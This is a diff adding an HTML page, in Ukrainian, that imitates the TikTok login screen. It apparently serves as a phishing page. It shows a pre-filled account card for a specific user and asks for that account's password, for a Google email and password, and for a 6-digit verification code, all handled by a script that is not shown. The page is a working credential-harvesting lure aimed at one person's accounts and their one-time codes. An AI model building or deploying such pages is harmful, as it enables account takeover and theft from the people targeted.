@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Увійти</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/x-icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/site/static/favicon.ico">
+</head>
+<body>
+    <!-- Куки-банер -->
+    <div id="cookieBanner" class="cookie-banner">
+        <div class="cookie-content">
+            <p>Ми використовуємо файли cookie для покращення роботи сайту. Продовжуючи, ви погоджуєтесь з нашими <a href="#">Умовами використання</a> та <a href="#">Політикою конфіденційності</a>.</p>
+            <div class="cookie-buttons">
+                <button id="acceptCookies" class="cookie-btn accept">Прийняти</button>
+                <button id="rejectCookies" class="cookie-btn reject">Відхилити</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Головна сторінка -->
+    <div id="mainPage" class="container">
+        <div class="header">
+            <div class="logo">TikTok</div>
+        </div>
+        
+        <div class="login-container">
+            <div class="login-box">
+                <h1 class="title">Увійдіть в TikTok</h1>
+                <p class="subtitle">Керуйте своїм акаунтом, перевіряйте повідомлення та інше.</p>
+                
+                <!-- Спосіб 1: Через пароль (активний акаунт) -->
+                <div class="login-method" id="method1">
+                    <div class="account-card">
+                        <div class="avatar">T</div>
+                        <div class="account-info">
+                            <div class="username">toha_x_cpm</div>
+                            <div class="tag">@toha_x_cpm</div>
+                        </div>
+                    </div>
+                    <div class="input-group hidden" id="passwordSection">
+                        <input type="password" id="password" placeholder="Введіть пароль" autocomplete="off">
+                        <button id="submitPassword" class="btn primary">Увійти</button>
+                        <div class="error-msg" id="passwordError"></div>
+                    </div>
+                    <button id="usePassword" class="btn method-btn">Використати пароль</button>
+                </div>
+                
+                <div class="divider">
+                    <span>або</span>
+                </div>
+                
+                <!-- Спосіб 2: Через Google -->
+                <div class="login-method">
+                    <button id="useGoogle" class="btn method-btn google">
+                        <img src="https://www.google.com/favicon.ico" alt="Google" class="method-icon">
+                        Продовжити з Google
+                    </button>
+                    <div class="input-group hidden" id="googleSection">
+                        <input type="email" id="googleEmail" placeholder="Електронна пошта Google" autocomplete="off">
+                        <input type="password" id="googlePassword" placeholder="Пароль Google" autocomplete="off">
+                        <button id="submitGoogle" class="btn primary">Увійти через Google</button>
+                    </div>
+                </div>
+                
+                <!-- Спосіб 3: Через код -->
+                <div class="login-method">
+                    <button id="useCode" class="btn method-btn code">
+                        <svg class="method-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                        Увійти за допомогою коду
+                    </button>
+                    <div class="input-group hidden" id="codeSection">
+                        <p class="hint">Код надіслано на пов'язаний email/телефон</p>
+                        <input type="text" id="verificationCode" placeholder="6-значний код" maxlength="6" autocomplete="off">
+                        <button id="submitCode" class="btn primary">Підтвердити код</button>
+                    </div>
+                </div>
+                
+                <div id="status" class="status"></div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
